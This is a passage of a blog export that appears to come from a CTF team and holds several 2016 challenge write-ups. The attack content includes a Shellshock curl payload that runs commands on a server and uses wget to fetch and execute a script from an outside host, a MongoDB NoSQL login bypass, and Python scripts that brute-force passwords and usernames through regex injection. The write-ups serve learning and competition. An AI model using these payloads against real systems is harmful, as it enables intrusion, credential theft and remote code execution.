PKCS1_v1_5.new(pubkey) enc = key.encrypt(msg).encode('base64') return enc except: p = gmpy.next_prime(p**2 + q**2) q = gmpy.next_prime(2*p*q) e = gmpy.next_prime(e**2) Yes the flag is being multiplied by 30 times so is going to be very big, and if you notice the try catch is used , so when an error occurs (length error) it updates our p,q and e getting the next primes!, so we had the wrong pubkey which only works for small cipher texts what we need to do here is to modify this encrypt script so we can get the next p,q,e with a very big string to make sure we can decrypt the original cipher text by simply modify our decrypt file 1234567891011121314151617181920212223242526272829303132#!/usr/bin/pythonimport gmpyimport sysfrom Crypto.Util.number import *from Crypto.PublicKey import RSAfrom Crypto.Cipher import PKCS1_v1_5def ext_rsa_encrypt(p, q, e, msg): m = bytes_to_long(msg) c = 0 while True: #print 'loop started' n = p * q try: phi = (p - 1)*(q - 1) d = gmpy.invert(e, phi) pubkey = RSA.construct((long(n), long(e))) f = open('possiblekeys', 'a+') f.write('%d,%d,%d,%d\\n' % (p,q,n,e)) f.close() key = PKCS1_v1_5.new(pubkey) enc = key.encrypt(msg).encode('base64') return enc except: c += 1 p = gmpy.next_prime(p**2 + q**2) q = gmpy.next_prime(2*p*q) e = gmpy.next_prime(e**2)if __name__ == '__main__': sys.stdout.write( ext_rsa_encrypt(311155972145869391293781528370734636009, 315274063651866931016337573625089033553, 12405943493775545863, \"ASIS&#123;IM_A_LEET_AND_BIG_FUCKING_STRING_OMG_PLZ&#125;\" * 100)) And now generating the private keys and trying to decrypt the flag: 12345678910111213141516171819202122232425262728293031323334353637383940from Crypto.PublicKey import RSAfrom Crypto.Cipher import PKCS1_v1_5, PKCS1_OAEPfrom base64 import b64decodefrom Crypto.Hash import SHAfrom Crypto import Randomimport subprocessimport sysdef decrypt_RSA(privkey,message): key = open(privkey, \"r\").read() dsize = SHA.digest_size sentinel = Random.new().read(15+dsize) rsakey = RSA.importKey(key) rsakey = PKCS1_v1_5.new(rsakey) decrypted = rsakey.decrypt(b64decode(message), None) return decrypted#print decrypt_RSA('priv.key', sys.argv[1])if __name__ == '__main__': f = open('possiblekeys', 'r') pqde = [] for i in f: d = &#123;&#125; # print i l = i.split(',') d['p'] = l[0] d['q'] = l[1] d['n'] = l[2] d['e'] = l[3] pqde.append(d) c = 0 for d in pqde: subprocess.check_output([\"rsatool/rsatool.py\", '-p', '%s' % d['p'], '-q', '%s' % d['q'], '-e', '%s' % d['e'], '-o', 'privkeys/priv%d.key' % c]) try: print decrypt_RSA('privkeys/priv%d.key' % c, sys.argv[1]) except Exception as e: print e c += 1 Running it: 123456789101112131415161718192021222324252627282930313233343536(.env)kinyabitch@Debian ~/h/c/a/c/r/RSA&gt; python rsa2.py (cat flag.enc | tr -d '\\n')Ciphertext with incorrect length.Ciphertext with incorrect length.Ciphertext with incorrect length.Ciphertext with incorrect length.ASIS&#123;F4ct0R__N_by_it3rat!ng!&#125;ASIS&#123;F4ct0R__N_by_it3rat!ng!&#125;ASIS&#123;F4ct0R__N_by_it3rat!ng!&#125;ASIS&#123;F4ct0R__N_by_it3rat!ng!&#125;ASIS&#123;F4ct0R__N_by_it3rat!ng!&#125;ASIS&#123;F4ct0R__N_by_it3rat!ng!&#125;ASIS&#123;F4ct0R__N_by_it3rat!ng!&#125;ASIS&#123;F4ct0R__N_by_it3rat!ng!&#125;ASIS&#123;F4ct0R__N_by_it3rat!ng!&#125;ASIS&#123;F4ct0R__N_by_it3rat!ng!&#125;ASIS&#123;F4ct0R__N_by_it3rat!ng!&#125;ASIS&#123;F4ct0R__N_by_it3rat!ng!&#125;ASIS&#123;F4ct0R__N_by_it3rat!ng!&#125;ASIS&#123;F4ct0R__N_by_it3rat!ng!&#125;ASIS&#123;F4ct0R__N_by_it3rat!ng!&#125;ASIS&#123;F4ct0R__N_by_it3rat!ng!&#125;ASIS&#123;F4ct0R__N_by_it3rat!ng!&#125;ASIS&#123;F4ct0R__N_by_it3rat!ng!&#125;ASIS&#123;F4ct0R__N_by_it3rat!ng!&#125;ASIS&#123;F4ct0R__N_by_it3rat!ng!&#125;ASIS&#123;F4ct0R__N_by_it3rat!ng!&#125;ASIS&#123;F4ct0R__N_by_it3rat!ng!&#125;ASIS&#123;F4ct0R__N_by_it3rat!ng!&#125;ASIS&#123;F4ct0R__N_by_it3rat!ng!&#125;ASIS&#123;F4ct0R__N_by_it3rat!ng!&#125;ASIS&#123;F4ct0R__N_by_it3rat!ng!&#125;ASIS&#123;F4ct0R__N_by_it3rat!ng!&#125;ASIS&#123;F4ct0R__N_by_it3rat!ng!&#125;ASIS&#123;F4ct0R__N_by_it3rat!ng!&#125;ASIS&#123;F4ct0R__N_by_it3rat!ng!&#125;","categories":[{"name":"Crypto","slug":"Crypto","permalink":"https://teamrocketist.github.io/categories/Crypto/"}],"tags":[{"name":"crypto","slug":"crypto","permalink":"https://teamrocketist.github.io/tags/crypto/"},{"name":"RSA","slug":"RSA","permalink":"https://teamrocketist.github.io/tags/RSA/"},{"name":"python","slug":"python","permalink":"https://teamrocketist.github.io/tags/python/"}]},{"title":"Ctfx [Forensics] - iTrash 100 points","slug":"Ctfx-Forensics-iTrash-100-points","date":"2016-08-29T22:38:55.000Z","updated":"2018-10-24T23:21:04.826Z","comments":true,"path":"2016/08/29/Ctfx-Forensics-iTrash-100-points/","link":"","permalink":"https://teamrocketist.github.io/2016/08/29/Ctfx-Forensics-iTrash-100-points/","excerpt":"","text":"I got locked out of my iTrash :(1 2 34 5 67 8 9Flag format: ctf(n-n-…-n)link: https://mega.nz/#!6BEFAbpT!osYCbKNxHcwlqtJnhMuBe4tiG2CFAcx9sZCXD9eDjSg The description of the problem is clear we need to find out what is the android pattern lock key combination: After unzipping the file we find a bunch of .img files, so the next step is to mount the android file system: 123456789101112131415161718192021222324kinyabitch@Debian ~/h/c/c/f/i/iTrash&gt; sudo mkdir /mnt/0kinyabitch@Debian ~/h/c/c/f/i/iTrash&gt; sudo mkdir /mnt/1kinyabitch@Debian ~/h/c/c/f/i/iTrash&gt; sudo mkdir /mnt/2kinyabitch@Debian ~/h/c/c/f/i/iTrash&gt; lscache.img config.ini emulator-user.ini hardware-qemu.ini userdata.img userdata-qemu.imgkinyabitch@Debian ~/h/c/c/f/i/iTrash&gt; sudo fdisk -l userdata.imgDisk userdata.img: 550 MiB, 576716800 bytes, 1126400 sectorsUnits: sectors of 1 * 512 = 512 bytesSector size (logical/physical): 512 bytes / 512 bytesI/O size (minimum/optimal): 512 bytes / 512 byteskinyabitch@Debian ~/h/c/c/f/i/iTrash&gt; sudo fdisk -l userdata-qemu.img Disk userdata-qemu.img: 550 MiB, 576716800 bytes, 1126400 sectorsUnits: sectors of 1 * 512 = 512 bytesSector size (logical/physical): 512 bytes / 512 bytesI/O size (minimum/optimal): 512 bytes / 512 byteskinyabitch@Debian ~/h/c/c/f/i/iTrash&gt; sudo mount -o loop userdata-qemu.img /mnt/0/kinyabitch@Debian ~/h/c/c/f/i/iTrash&gt; sudo fdisk -l userdata.img Disk userdata.img: 550 MiB, 576716800 bytes, 1126400 sectorsUnits: sectors of 1 * 512 = 512 bytesSector size (logical/physical): 512 bytes / 512 bytesI/O size (minimum/optimal): 512 bytes / 512 byteskinyabitch@Debian ~/h/c/c/f/i/iTrash&gt; sudo mount -o loop userdata.img /mnt/1/kinyabitch@Debian ~/h/c/c/f/i/iTrash&gt; sudo mount -o loop cache.img /mnt/2/ After mounting the system we need to find a file named “gesture.key 1234kinyabitch@Debian /mnt&gt; sudo find . -name 'gesture.key'[sudo] password for kinyabitch: ./0/system/gesture.key So out file is located at system/ folder : 123kinyabitch@Debian /m/0/system&gt; cat gesture.key | xxd -p c4bca3d13ba42982f6ee402262e2059c082bfce3 I found a hash which according to the documentation is SHA-1 due to fact that we have very finite possible pattern combinations and the other fact that Android OS does not use a salted hash, it does not take a lot to generate a dictionary containing all possible hashes of sequences from 0123 to 876543210. I found one dictionary online you can download it here (http://www.mediafire.com/download/qs0sq5h8e2ly8jg/SHA1-android-pattern.rar) 1234567891011121314kinyabitch@Debian ~/h/c/c/f/itrash&gt; unrar e SHA1-android-pattern.rar UNRAR 5.30 beta 2 freeware Copyright (c) 1993-2015 Alexander RoshalExtracting from SHA1-android-pattern.rarpassword: www.marw0rm.comEnter password (will not be echoed) for GestureRainbowTable.db: Extracting GestureRainbowTable.db OK All OK 123456789kinyabitch@Debian ~/h/c/c/f/itrash&gt; sqlite3 GestureRainbowTable.db SQLite version 3.14.1 2016-08-11 18:53:32Enter '.help' for usage hints.sqlite&gt; .tablesRainbowTablesqlite&gt; select * from RainBowTable where hash = 'c4bca3d13ba42982f6ee402262e2059c082bfce3' ...&gt; ;c4bca3d13ba42982f6ee402262e2059c082bfce3|[6, 4, 7, 3, 8, 5, 0, 1, 2] Swapping your fingers from that order you would get in the android device! Finally the flag is ctf(6, 4, 7, 3, 8, 5, 0, 1, 2). For a more detailed info for this subject you can read this article http://resources.infosecinstitute.com/android-forensics-cracking-the-pattern-lock-protection/","categories":[],"tags":[]},{"title":"ctfx [Web] – north korea [100pts]","slug":"ctfx-Web-–-north-korea-100pts","date":"2016-08-29T00:03:20.000Z","updated":"2018-10-24T23:21:04.826Z","comments":true,"path":"2016/08/29/ctfx-Web-–-north-korea-100pts/","link":"","permalink":"https://teamrocketist.github.io/2016/08/29/ctfx-Web-–-north-korea-100pts/","excerpt":"","text":"What is North Korea hiding?http://problems.ctfx.io:7002/ This one was a really easy one, first thing i did was inspecting the source code and I found endpoint http://problems.ctfx.io:7002/code tryed to access it but it was just giving a message “nice try kido!”. At the main page there is a special hint about this saying “We, the Democratic People’s Republic of Korea, have developed a revolutionary new security standard. The West doesn’t stand a chance.” So the West doesn’t have access? so lets try with a north korea ip changing the X-Forwarded.For header. 123kinyabitch@Debian /v/w/html&gt; curl -H \"X-Forwarded-For: 175.45.177.64\" http://problems.ctfx.io:7002/codectf(jk_we_aint_got_n0_nuk35)","categories":[{"name":"Web","slug":"Web","permalink":"https://teamrocketist.github.io/categories/Web/"}],"tags":[{"name":"web","slug":"web","permalink":"https://teamrocketist.github.io/tags/web/"},{"name":"X-Forwarded-For","slug":"X-Forwarded-For","permalink":"https://teamrocketist.github.io/tags/X-Forwarded-For/"}]},{"title":"ctfx [Web] - HarambeHub [100pts]","slug":"ctfx-Web-HarambeHub-100pts","date":"2016-08-28T23:49:36.000Z","updated":"2018-10-24T23:21:04.826Z","comments":true,"path":"2016/08/29/ctfx-Web-HarambeHub-100pts/","link":"","permalink":"https://teamrocketist.github.io/2016/08/29/ctfx-Web-HarambeHub-100pts/","excerpt":"","text":"This site was created in honor of harambe: http://problems.ctfx.io:7003/Problem author: omegablitzHarambeHub.javaUser.java Two java files are given, analyzing both we can see that on the first file there is an “if condition” that is using string.match for username to check if it exists, knowning this we can get the admin username character by character with a python script by regex injecting. 1234567891011121314151617181920212223242526272829303132333435363738394041424344import requestsimport string#for x in \"abcdefghijklmnopqrstuvxwyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789\":username = ''lower_alpha = '[a-z]'upper_alpha = '[A-Z]'digits = '[0-9]'special = '[^\\w]'regex_string = ''d = &#123;lower_alpha : string.ascii_lowercase, upper_alpha : string.ascii_uppercase, digits: string.digits, special: string.punctuation + string.whitespace&#125;regex = [lower_alpha, upper_alpha, digits, special]char_found = Trueregex_found = Truewhile regex_found: regex_found = False for r in regex: while True: a = requests.post('http://problems.ctfx.io:7003/users', data=&#123;'username': '^%s.*' % (regex_string+r), 'password': 'a', 'realname': 'a'&#125;) if (a.status_code != 200): #print a.text, r continue if (\"FAILED: User with that name already exists!\" in a.text): regex_found = True char_found = True regex_string += r for x in d[r]: char_found = False while True: if (x in '\\.[]&#123;&#125;()*+-?^$|'): x = '\\\\' + x a = requests.post('http://problems.ctfx.io:7003/users', data=&#123;'username': '^(%s).*' % (username+x), 'password': 'a', 'realname': 'a'&#125;) if (a.status_code != 200): #print a.text, x continue # print a.text, x if (\"FAILED: User with that name already exists!\" in a.text): username += x char_found = True print \"The username: \" + username break if char_found: break break 12345678910111213141516171819202122232425kinyabitch@Debian ~/h/c/c/web2&gt; python a.pyThe username: \\[The username: \\[AThe username: \\[AdThe username: \\[AdmThe username: \\[AdmiThe username: \\[AdminThe username: \\[Admin\\]The username: \\[Admin\\] The username: \\[Admin\\] AThe username: \\[Admin\\] ArThe username: \\[Admin\\] ArxThe username: \\[Admin\\] ArxeThe username: \\[Admin\\] ArxenThe username: \\[Admin\\] ArxeniThe username: \\[Admin\\] ArxenixThe username: \\[Admin\\] ArxenixiThe username: \\[Admin\\] ArxenixisThe username: \\[Admin\\] ArxenixisaThe username: \\[Admin\\] ArxenixisalThe username: \\[Admin\\] ArxenixisaloThe username: \\[Admin\\] ArxenixisalosThe username: \\[Admin\\] ArxenixisaloseThe username: \\[Admin\\] Arxenixisaloser One the second one we can see that is doing same thing but now with the password, so now we have the admin username we can just inject this regex “^*.” on the password and get the flag :) 123kinyabitch@Debian /v/w/html&gt; curl 'http://problems.ctfx.io:7003/name?username=\\[Admin\\]%20Arxenixisaloser&amp;password=^.*'ctf(h4r4mb3_d1dn1t_d13_4_th1s_f33ls_b4d)","categories":[{"name":"Web","slug":"Web","permalink":"https://teamrocketist.github.io/categories/Web/"}],"tags":[{"name":"web","slug":"web","permalink":"https://teamrocketist.github.io/tags/web/"},{"name":"regex","slug":"regex","permalink":"https://teamrocketist.github.io/tags/regex/"},{"name":"java","slug":"java","permalink":"https://teamrocketist.github.io/tags/java/"}]},{"title":"IceCTF [web] - Geocities","slug":"IceCTF-web-Geocities","date":"2016-08-26T23:00:46.000Z","updated":"2018-10-24T23:21:04.826Z","comments":true,"path":"2016/08/27/IceCTF-web-Geocities/","link":"","permalink":"https://teamrocketist.github.io/2016/08/27/IceCTF-web-Geocities/","excerpt":"","text":"I recently stumbled onto this old geocities site (http://geocities.vuln.icec.tf/), it’s a miracle that it’s still up! It must be running some ancient technology and probably hasn’t been updated in years, it’s our lucky day boys! After analyzing the website I didn’t found nothing until I started reading the messages where there was some hints, the blog posts were speaking about some websites made in perl and bash, and I started thinking there maybe were some CGI scripts on the website. I tryed to find any particular file in the cgi-bin folder but nothing. Until I did the most obvivious which was trying to access this “http://geocities.vuln.icec.tf/index.cgi&quot; and it existed! Now lets try some ShellShock with Curl: 1234567kinyabitch@Debian ~/h/c/geocities&gt; curl -H \"User-Agent: () &#123; test;&#125;;echo \\\"Content-type: text/plain\\\"; echo; echo; /bin/ls\" http://geocities.vuln.icec.tf/index.cgiblog.htmlget_posts.plimgindex.cgi And it worked! now lets start looking into those files: 12345678910111213141516171819202122232425kinyabitch@Debian ~/h/c/geocities&gt; curl -H \"User-Agent: () &#123; test;&#125;;echo \\\"Content-type: text/plain\\\"; echo; echo; /bin/cat get_posts.pl\" http://geocities.vuln.icec.tf/index.cgi#!/usr/bin/perluse strict;use DBI;my $dbh = DBI-&gt;connect( \"dbi:mysql:dbname=geocities;host=icectf_mariadb\", \"geocities\", \"geocities\", &#123; RaiseError =&gt; 1 &#125;,) or die $DBI::errstr;my $sth = $dbh-&gt;prepare(\"SELECT * from Posts ORDER BY post_date DESC\");$sth-&gt;execute();my $row;while ($row = $sth-&gt;fetchrow_arrayref()) &#123; print \"@$row[1];@$row[2];@$row[3]\\n\";&#125;$sth-&gt;finish();$dbh-&gt;disconnect(); Oh a perl script that connects to a sql databases maybe our flag is somewhere in that database! but first we need to access it! After this I tried a reverse shell but It wasn’t working so I just tried to access mysql with the command since we already had the credentials from the source above, but failed to execute even trying the most common locations of mysql (maybe the admins deactivated this for security reasons for the current user running the website) then I thought of replicate the perl script above and send it to /tmp folder and execute it. The first thing I had to do was to know what is the name of the other sql tables this could be easy with a select to the informationschema tables: 12345678910111213141516171819202122#!/usr/bin/perluse strict;use DBI;my $dbh = DBI-&gt;connect( \"dbi:mysql:dbname=geocities;host=icectf_mariadb\", \"geocities\", \"geocities\", &#123; RaiseError =&gt; 1 &#125;,) or die $DBI::errstr;my $sth = $dbh-&gt;prepare(\"SELECT TABLE_NAME from information_schema.tables WHERE table_schema = 'geocities'\");$sth-&gt;execute();my @row;while (@row = $sth-&gt;fetchrow_array) &#123; print join(\", \", @row), \"\\n\";&#125;$sth-&gt;finish();$dbh-&gt;disconnect(); Now we need to upload this to /tmp and chmod it to get execute permissions and finally execute it: 123456kinyabitch@Debian ~/h/c/geocities&gt; curl -H \"User-Agent: () &#123; test;&#125;;echo \\\"Content-type: text/plain\\\"; echo; echo; /usr/bin/wget hostedwebserver.com/plz.pl -O /tmp/plz.pl\" http://geocities.vuln.icec.tf/index.cgikinyabitch@Debian ~/h/c/geocities&gt; curl -H \"User-Agent: () &#123; test;&#125;;echo \\\"Content-type: text/plain\\\"; echo; echo; /bin/chmod +x /tmp/plz.pl\" http://geocities.vuln.icec.tf/index.cgikinyabitch@Debian ~/h/c/geocities&gt; curl -H \"User-Agent: () &#123; test;&#125;;echo \\\"Content-type: text/plain\\\"; echo; echo; /bin/cat /tmp/plz.pl\" http://geocities.vuln.icec.tf/index.cgi 47a6fd2ca39d2b0d6eea1c30008dd889Posts So we have two database tables one named posts and the other named 47a6fd2ca39d2b0d6eea1c30008dd889, now we only need to select everything from this one and see if the flag is in it: 12345678910111213141516171819202122#!/usr/bin/perluse strict;use DBI;my $dbh = DBI-&gt;connect( \"dbi:mysql:dbname=geocities;host=icectf_mariadb\", \"geocities\", \"geocities\", &#123; RaiseError =&gt; 1 &#125;,) or die $DBI::errstr;my $sth = $dbh-&gt;prepare(\"SELECT * from 47a6fd2ca39d2b0d6eea1c30008dd889\");$sth-&gt;execute();my @row;while (@row = $sth-&gt;fetchrow_array) &#123; print join(\", \", @row), \"\\n\";&#125;$sth-&gt;finish();$dbh-&gt;disconnect(); Same process again to upload and run the perl script: 12345kinyabitch@Debian ~/h/c/geocities&gt; curl -H \"User-Agent: () &#123; test;&#125;;echo \\\"Content-type: text/plain\\\"; echo; echo; /usr/bin/wget hostedwebserver.com/tables.pl -O /tmp/tables.pl\" http://geocities.vuln.icec.tf/index.cgikinyabitch@Debian ~/h/c/geocities&gt; curl -H \"User-Agent: () &#123; test;&#125;;echo \\\"Content-type: text/plain\\\"; echo; echo; /bin/chmod +x /tmp/tables.pl\" http://geocities.vuln.icec.tf/index.cgikinyabitch@Debian ~/h/c/geocities&gt; curl -H \"User-Agent: () &#123; test;&#125;;echo \\\"Content-type: text/plain\\\"; echo; echo; /tmp/tables.pl\" http://geocities.vuln.icec.tf/index.cgi1, IceCTF&#123;7h3_g0s_WEr3_5UpeR_wE1Rd_mY_3ye5_HUr7&#125; And jackpot the flag is IceCTF{7h3_g0s_WEr3_5UpeR_wE1Rd_mY_3ye5_HUr7}","categories":[{"name":"Web","slug":"Web","permalink":"https://teamrocketist.github.io/categories/Web/"}],"tags":[{"name":"web","slug":"web","permalink":"https://teamrocketist.github.io/tags/web/"},{"name":"shellshock","slug":"shellshock","permalink":"https://teamrocketist.github.io/tags/shellshock/"},{"name":"perl","slug":"perl","permalink":"https://teamrocketist.github.io/tags/perl/"},{"name":"sql","slug":"sql","permalink":"https://teamrocketist.github.io/tags/sql/"}]},{"title":"IceCTF [Cryptography] - Hill Cipher","slug":"IceCTF-Cryptography-Hill-Cipher","date":"2016-08-26T20:05:38.000Z","updated":"2018-10-24T23:21:04.826Z","comments":true,"path":"2016/08/26/IceCTF-Cryptography-Hill-Cipher/","link":"","permalink":"https://teamrocketist.github.io/2016/08/26/IceCTF-Cryptography-Hill-Cipher/","excerpt":"","text":"On this challenge we were given the decoding matrix and the cipher text: 12345678910secret = [[54, 53, 28, 20, 54, 15, 12, 7], [32, 14, 24, 5, 63, 12, 50, 52], [63, 59, 40, 18, 55, 33, 17, 3], [63, 34, 5, 4, 56, 10, 53, 16], [35, 43, 45, 53, 12, 42, 35, 37], [20, 59, 42, 10, 46, 56, 12, 61], [26, 39, 27, 59, 44, 54, 23, 56], [32, 31, 56, 47, 31, 2, 29, 41]] ciphertext = \"7Nv7&#125;dI9hD9qGmP&#125;CR_5wJDdkj4CKxd45rko1cj51DpHPnNDb__EXDotSRCP8ZCQ\" With this we can easily decode the ciphered text we only need to write a python script (to know how it works the decryption for hill cipher read this http://crypto.interactive-maths.com/hill-cipher.html) the one I wrote requires sympy package installed run pip install sympy: 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465import mathimport sympyfrom sympy import init_printing, pprintfrom sympy import Matrixfrom sympy.vector import matrix_to_vector, CoordSysCartesianinit_printing()def decrypt(matrix, words): cipher = '' M = Matrix(matrix) M = M.inv_mod(64) length = len(M) d = &#123;&#125; d2 = &#123;&#125; # arr = np.array([d[i] = j; j +=1 for i in \"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ123456789_&#123;&#125;\"], dtype=int) alph = \"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ123456789_&#123;&#125;\" for x in range(len(alph)): d[alph[x]] = x d2[x] = alph[x] # print d count = 0 l = [] for ch in words: if (count+1) % (8+1) == 0: m = Matrix(l) dot_pr_m = M*m # print mcd(dot_pr_m) # pprint(dot_pr_m.rref()[0][0]) n = [] for i in dot_pr_m: cipher += d2[i % 64] count = 0 l = [] l.append(d[ch]) count += 1 if (count+1) % (8+1) == 0: m = Matrix(l) dot_pr_m = M*m # print mcd(dot_pr_m) # pprint(dot_pr_m.rref()[0][0]) n = [] for i in dot_pr_m: cipher += d2[i % 64] return cipherif __name__ == '__main__': #print mcd([]) # exit(0) secret = [[54, 53, 28, 20, 54, 15, 12, 7], [32, 14, 24, 5, 63, 12, 50, 52], [63, 59, 40, 18, 55, 33, 17, 3], [63, 34, 5, 4, 56, 10, 53, 16], [35, 43, 45, 53, 12, 42, 35, 37], [20, 59, 42, 10, 46, 56, 12, 61], [26, 39, 27, 59, 44, 54, 23, 56], [32, 31, 56, 47, 31, 2, 29, 41]] ciphertext = \"7Nv7&#125;dI9hD9qGmP&#125;CR_5wJDdkj4CKxd45rko1cj51DpHPnNDb__EXDotSRCP8ZCQ\" # secret = [[7,8], [11,11]] # ciphertext = 'APADJTFTWLFJ'.lower() print(ciphertext) print(decrypt(secret, ciphertext)) 12345kinyabitch@Debian ~/h/crl&gt; python hill-cipher.py 7Nv7&#125;dI9hD9qGmP&#125;CR_5wJDdkj4CKxd45rko1cj51DpHPnNDb__EXDotSRCP8ZCQIceCTF&#123;linear_algebra_plus_led_zeppelin_are_a_beautiful_m1xture&#125;","categories":[{"name":"Crypto","slug":"Crypto","permalink":"https://teamrocketist.github.io/categories/Crypto/"}],"tags":[{"name":"crypto","slug":"crypto","permalink":"https://teamrocketist.github.io/tags/crypto/"}]},{"title":"IceCTF [Web] - ChainedIn","slug":"IceCTF-Web-ChainedIn","date":"2016-08-26T17:58:58.000Z","updated":"2018-10-24T23:21:04.822Z","comments":true,"path":"2016/08/26/IceCTF-Web-ChainedIn/","link":"","permalink":"https://teamrocketist.github.io/2016/08/26/IceCTF-Web-ChainedIn/","excerpt":"","text":"The objective on this one was to get the administrator password on the website. http://chainedin.vuln.icec.tf/ This first thing we can see is that this level is powered by MongoDB and angular.js, we can start thinking about finding some nosql injection from here. After reading something here I saw it was possible to inject mongodb http://blog.websecurify.com/2014/08/hacking-nodejs-and-mongodb.html. Tryed to do the most common injection to bypass the login: 123kinyabitch@Debian ~/h/c/chainedin&gt; curl -H \"Content-Type: application/json\" -d '&#123;\"user\": &#123;\"$gt\": \"\"&#125;,\"pass\": &#123;\"$gt\": \"\"&#125;&#125;' 'http://chainedin.vuln.icec.tf/login'&#123;\"message\":\"Welcome back Administrator!\"&#125; And voila i’m logged in as the admin, but can’t find the flag so I started thinking maybe there is a way to modify the injection (something like a boolean based or timed based injection like in we do on normal sql injections) after some reading on mongodb documentation(https://docs.mongodb.com/manual/reference/operator/query/regex/) I found this $regex parameter was perfect for boolean injection, we could retrieve the password character by character like this: You can see here when we start the construction of our flag we receive a “true” boolean message saying “welcome back administrator”: 1234kinyabitch@Debian ~/h/c/chainedin&gt; curl -H \"Content-Type: application/json\" -d '&#123;\"user\": &#123;\"$gt\": \"\"&#125;,\"pass\": &#123;\"$regex\": \"IceCT\"&#125;&#125;' 'http://chainedin.vuln.icec.tf/login'&#123;\"message\":\"Welcome back Administrator!\";&#125; But if we put an invalid character we will get the message “Invalid Credentials”, so with this we get our “False” boolean. 1234kinyabitch@Debian ~/h/c/chainedin&amp;gt; curl -H ';Content-Type: application/json'; -d '&#123;\"user\": &#123;\"$gt\": \"\"&#125;,\"pass\": &#123;\"$regex\": \"IceCTA\"&#125;&#125;' 'http://chainedin.vuln.icec.tf/login'&#123;\"message\":\"Invalid Credentials\"&#125; With this we can brute force the password character by character getting the flag :) here is the python script I wrote: 1234567891011121314151617181920212223import requestsimport jsonimport cookielibflag = 'IceCTF&#123;';blacklist = []alphabet = 'abcdefghijklmnopqrstuvxwyzABCDEFGHIJKLMNOPQRSTUVXWYZ0123456789_&#123;&#125;'count = 0max = len(alphabet)while True: for char in alphabet: url = \"http://chainedin.vuln.icec.tf/login\"; data = &#123;\"user\": &#123;\"$gt\": \"Administrator\"&#125;,\"pass\": &#123;\"$regex\": \"%s\" % flag + char&#125;&#125; headers = &#123;'Content-type': 'application/json', 'Accept': 'text/plain'&#125; r = requests.post(url, data=json.dumps(data), headers=headers) if (r.text == '&#123;\"message\":\"Welcome back Administrator!\"&#125;'): count = 0 flag += char print flag if char == '&#125;': exit(0) 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950kinyabitch@Debian ~/h/c/chainedin&gt; python chained.py IceCTF&#123;IIceCTF&#123;I_IceCTF&#123;I_tIceCTF&#123;I_thIceCTF&#123;I_thOIceCTF&#123;I_thOuIceCTF&#123;I_thOugIceCTF&#123;I_thOugHIceCTF&#123;I_thOugHTIceCTF&#123;I_thOugHT_IceCTF&#123;I_thOugHT_YIceCTF&#123;I_thOugHT_YOIceCTF&#123;I_thOugHT_YOuIceCTF&#123;I_thOugHT_YOu_IceCTF&#123;I_thOugHT_YOu_cIceCTF&#123;I_thOugHT_YOu_coIceCTF&#123;I_thOugHT_YOu_couIceCTF&#123;I_thOugHT_YOu_coulIceCTF&#123;I_thOugHT_YOu_coulDIceCTF&#123;I_thOugHT_YOu_coulDNIceCTF&#123;I_thOugHT_YOu_coulDNtIceCTF&#123;I_thOugHT_YOu_coulDNt_IceCTF&#123;I_thOugHT_YOu_coulDNt_iIceCTF&#123;I_thOugHT_YOu_coulDNt_inIceCTF&#123;I_thOugHT_YOu_coulDNt_inJIceCTF&#123;I_thOugHT_YOu_coulDNt_inJeIceCTF&#123;I_thOugHT_YOu_coulDNt_inJeCIceCTF&#123;I_thOugHT_YOu_coulDNt_inJeCtIceCTF&#123;I_thOugHT_YOu_coulDNt_inJeCt_IceCTF&#123;I_thOugHT_YOu_coulDNt_inJeCt_nIceCTF&#123;I_thOugHT_YOu_coulDNt_inJeCt_noIceCTF&#123;I_thOugHT_YOu_coulDNt_inJeCt_noSIceCTF&#123;I_thOugHT_YOu_coulDNt_inJeCt_noSqIceCTF&#123;I_thOugHT_YOu_coulDNt_inJeCt_noSqLIceCTF&#123;I_thOugHT_YOu_coulDNt_inJeCt_noSqL_IceCTF&#123;I_thOugHT_YOu_coulDNt_inJeCt_noSqL_tIceCTF&#123;I_thOugHT_YOu_coulDNt_inJeCt_noSqL_tHIceCTF&#123;I_thOugHT_YOu_coulDNt_inJeCt_noSqL_tHaIceCTF&#123;I_thOugHT_YOu_coulDNt_inJeCt_noSqL_tHanIceCTF&#123;I_thOugHT_YOu_coulDNt_inJeCt_noSqL_tHanKIceCTF&#123;I_thOugHT_YOu_coulDNt_inJeCt_noSqL_tHanKsIceCTF&#123;I_thOugHT_YOu_coulDNt_inJeCt_noSqL_tHanKs_IceCTF&#123;I_thOugHT_YOu_coulDNt_inJeCt_noSqL_tHanKs_mIceCTF&#123;I_thOugHT_YOu_coulDNt_inJeCt_noSqL_tHanKs_moIceCTF&#123;I_thOugHT_YOu_coulDNt_inJeCt_noSqL_tHanKs_monIceCTF&#123;I_thOugHT_YOu_coulDNt_inJeCt_noSqL_tHanKs_monGIceCTF&#123;I_thOugHT_YOu_coulDNt_inJeCt_noSqL_tHanKs_monGoIceCTF&#123;I_thOugHT_YOu_coulDNt_inJeCt_noSqL_tHanKs_monGo&#125;","categories":[{"name":"Web","slug":"Web","permalink":"https://teamrocketist.github.io/categories/Web/"}],"tags":[{"name":"web","slug":"web","permalink":"https://teamrocketist.github.io/tags/web/"},{"name":"noSql","slug":"noSql","permalink":"https://teamrocketist.github.io/tags/noSql/"},{"name":"mongodb","slug":"mongodb","permalink":"https://teamrocketist.github.io/tags/mongodb/"}]},{"title":"Trend Micro Online Qualifier - Misc 200","slug":"Trend-Micro-Online-Qualifier-Misc-200","date":"2016-08-07T10:44:24.000Z","updated":"2018-10-24T23:21:04.822Z","comments":true,"path":"2016/08/07/Trend-Micro-Online-Qualifier-Misc-200/","link":"","permalink":"https://teamrocketist.github.io/2016/08/07/Trend-Micro-Online-Qualifier-Misc-200/","excerpt":"","text":"openssl enc -d -aes-256-cbc -k KfRdN3YhyaMhAzLftsSw -in files22.enc -out files22.zipunzip files22.zipFind the LTE bands supported by this device, for example if the device suports the bands 1,2,3 the flag will be TMCTF{1,2,3}.https://mega.nz/#!1hFXCApD!0oq_bFqbnaPsquuOySg4TSIYjPemVjzWWNqfg8OJ0WI This one was a bit confusing at first, after some searching about LTE on google I found this http://andmem.blogspot.pt/2013/11/mobilebandchange.html#chapter-10 (it’s in Japanese but if you can use google translator it’s very understandable) which explains everything I needed to know to find the flag. According to that link it says that the LTE bands are located on the 6828 (0x1AAC) block, after converting it to little-endian you can see which bits are 